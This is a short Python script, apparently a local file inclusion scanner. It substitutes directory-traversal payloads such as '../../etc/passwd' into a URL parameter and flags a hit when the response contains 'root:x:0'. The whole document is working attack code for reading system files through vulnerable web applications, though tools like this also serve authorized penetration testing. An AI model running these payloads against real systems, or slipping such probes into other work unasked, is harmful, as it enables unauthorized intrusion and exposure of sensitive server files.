import requests
import sys


def LFI(URL):
	if len(URL) < 5:
		sys.exit("[-]ERROR - Missing target URL")
	elif not '{fuzz}' in URL:
		sys.exit("[-]ERROR - Missing {fuzz} parameter\nExemple : http://127.168.0.1/index.php?image=\{fuzz\}")
	else:
		selected_target = URL

	payloads = ['/etc/passwd','../etc/passwd','../../etc/passwd','../../../etc/passwd']

	for payload in payloads:
		target = selected_target.replace('{fuzz}', payload)
		req = requests.get(target)
		if b"root:x:0" in req.content:
			print("[+]SUCCESS - LFI vuln found with {}!".format(payload))
		else:
			pass
	print("[+]INFO - Scan finished")

if __name__ == '__main__':
	LFI("http://127.168.0.1/index.php?image={fuzz}")
